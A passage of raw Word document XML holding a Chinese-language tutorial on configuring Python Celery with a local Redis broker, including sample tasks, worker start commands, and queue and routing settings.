          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>目录同级目录执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>celery -A app1.app1_app worker -l info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5DE5A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app = Celery(main='app1_app',include=['tasks1', 'tasks2'])  # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>创建</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，并引入任务定义。</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>main</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>include</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数的值为模块名，所以都是指定命令的相对目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433FF8C8"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app.config_from_object('app1_config')  # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>通过配置文件</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>进行配置，而着这里是相对目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0837E49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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>使用下面的命令也可以启动</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，不过要该模块的名称，是的相对目录正确</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6348C60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app.start(argv=['celery', 'worker', '-l', 'info', '-f', 'log/celery.log', "-c", "40"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E1C03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一定要注意模块的相对目录，和你想要执行命令的目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6498480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lastRenderedPageBreak/>
        <w:t>#</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>首先创建了一个</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实例</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实例化的过程中，制定了任务名</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也就是包名</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模块名</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的第一个参数是当前模块的名称，我们可以调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>config_from_object()</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来让</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实例加载配置模块，我的例子中的配置文件起名为</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1_config.py,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>配置文件如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4111634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BROKER_URL = 'redis://127.0.0.1:6379/5'   # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>配置</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">broker  </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531B8AD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CELERY_RESULT_BACKEND = 'redis://127.0.0.1:6379/6'   # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>配置</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>backend</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>结果存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AA3C5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CELERY_ACCEPT_CONTENT = ['json']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D98E1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CELERY_TASK_SERIALIZER = 'json'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302D53A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CELERY_RESULT_SERIALIZER = 'json'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55EE660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在配置文件中我们可以对任务的执行等进行管理，比如说我们可能有很多的任务</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但是我希望有些优先级比较高的任务先被执行</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而不希望先进先出的等待。那么需要引入一个队列的问题</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也就是说在我的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>broker</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的消息存储里面有一些队列，他们并行运行，但是</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只从对应</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的队列里面取任务。在这里我们希望</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>tasks.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的某些任务先被执行。</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中我设置了两个任务：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CD4E9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所以我通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>from celery import group</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>引入</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>group,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用来创建并行执行的一组任务。然后这块现需要理解的就是这个</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>@app.task,@</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>符号在</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中用作函数修饰符，到这块我又回头去看</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的装饰器</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在代码运行期间动态增加功能的方式</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到底是如何实现的，在这里的作用就是通过</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装饰器在可调用的对象（</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）上创建一个任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204D099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tasks1.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4674CC2D"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app1.app1_app import app</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C9C5A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CB028FB"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@app.task</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D20D71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def deal1(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE83FC8"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print(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE3BEDC"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return text+"======="</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1DEAA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tasks2.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BF84FF"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app1.app1_app import app</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5E084B"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571276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@app.task</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71013B29"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def deal2(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57477C3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print(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C745E0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return text+"+++++++++"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4747566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队列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C9B78F"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了解完装饰器后，我回过头去整理配置的问题，前面提到任务的优先级问题，在这个例子中如果我们想让</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>deal1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个任务优先于</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>deal2</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>任务被执行，我们可以将两个任务放到不同的队列中，由我们决定先执行哪个任务，我们可以在配置文件</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1_config.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中增加这样配置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5393A72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URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的格式为：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="627FE0C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redis://:password@hostname:port/db_number</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDEFDD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2BBC3EB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kombu import Exchange,Queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBF2C7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BROKER_URL = 'redis://127.0.0.1:6379/5'   # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>配置</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">broker  </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1419318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CELERY_RESULT_BACKEND = 'redis://127.0.0.1:6379/6'   # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>配置</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>backend</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>结果存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258E350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lastRenderedPageBreak/>
        <w:t>CELERY_ACCEPT_CONTENT = ['json']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B961D38"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CELERY_TASK_SERIALIZER = 'json'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EBE3F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CELERY_RESULT_SERIALIZER = 'json'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C94F61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w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>当使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>作为</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>broker</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时，</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Exchange</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的名字必须和</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Queue</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的名字一样</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B179C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CELERY_QUEUES = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289A2575"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Queue("default", Exchange("default"), routing_key = "default"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9BC2B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Queue("for_task1", Exchange("for_task1"), routing_key="task_a"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E89855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Queue("for_task2", Exchange("for_task2"), routing_key="task_b")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCDA13E"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37AF8F4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定义任务的走向，不同的任务发送</w:t>
      </w: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进入不同的队列，并为不同的任务设定不同的</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>routing_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65197D9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若没有指定这个任务</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>route</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>到那个</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Queue</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中去执行，此时执行此任务的时候，会</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>route</w:t>
      </w:r>
      <w:r w:rsidRPr="00054E4F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>到</w:t>
      </w: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默认的名字叫做</w:t>
      </w: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的队列中去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF5383F"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CELERY_ROUTES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637B898C"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'app1.tasks1.deal1': {"queue": "for_task1", "routing_key": "task_a"},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1558B6B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'app1.tasks2.deal2':{"queue":"for_task2","routing_key":"task_b"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0765A7A7"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DD751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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>先了解了几个常用的参数的含义：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E25292"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Exchange:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>交换机，决定了消息路由规则；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="108662A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Queue:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>消息队列；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E82D88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Channel:</w:t>
      </w:r>
